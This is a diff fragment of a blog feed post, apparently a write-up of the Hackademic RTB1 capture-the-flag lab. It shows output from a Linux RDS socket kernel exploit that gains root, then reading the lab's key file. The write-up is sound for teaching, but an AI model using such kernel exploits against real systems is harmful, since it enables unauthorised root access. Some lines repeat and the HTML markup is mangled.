+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[</em>] Overwriting security ops&hellip;
+[<em>] Overwriting function pointer&hellip;
+[</em>] Linux kernel >= 2.6.30 RDS socket exploit
+[<em>] by Dan Rosenberg
+[</em>] Resolving kernel addresses&hellip;
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[<em>] Overwriting security ops&hellip;
+[</em>] Overwriting function pointer&hellip;
+[<em>] Triggering payload&hellip;
+[</em>] Restoring function pointer&hellip;
+whoami
+root
+cd /root/                                                                     <br/>
+ls
+Desktop
+anaconda-ks.cfg
+key.txt
+key.txt~
+cat key.txt
+Yeah!!
+You must be proud because you &rsquo;ve got the password to complete the First <em>Realistic</em> Hackademic Challenge (Hackademic.RTB1) :)</p>
+
+<p>$<em>d&amp;jgQ>>ak#b"(Hx"o&lt;la</em>%</p>
+
+<p>Regards,
+mr.pr0n || p0wnbox.Team || 2011
+<a href="http://p0wnbox.com">http://p0wnbox.com</a>
+```</p>
+
+<p>And that&rsquo;s game!  Pretty nice box, though I must admit priv esc vulnerabilities in out of date kernels are rather boring.  Next up, Hackademic RTB2.</p>
 ]]></content>
   </entry>
   
